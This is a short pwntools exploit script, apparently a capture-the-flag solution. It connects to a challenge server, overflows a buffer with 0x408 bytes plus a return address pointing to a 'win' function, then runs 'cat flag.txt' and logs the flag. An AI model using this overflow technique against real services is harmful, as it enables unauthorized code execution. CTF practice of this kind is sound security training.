#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./test", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b *0x0000000000401716")
p = remote("34.30.75.212", 32059)

p.sendlineafter(b">", b"1")
p.sendlineafter(b"> ", b"1.2")
p.sendlineafter(b"> ", b"0.00012")

p.sendlineafter(b"> ", b"1337")
p.readline()
payload = b""
payload += b"A" * 0x408
payload += p64(elf.sym["_Z3winv"] + 8)
p.sendlineafter(b"> ", payload)

p.sendline(b"/bin/cat flag.txt")

log.success(p.readline().decode()) # DEAD{so_ez_pwn_hehe}
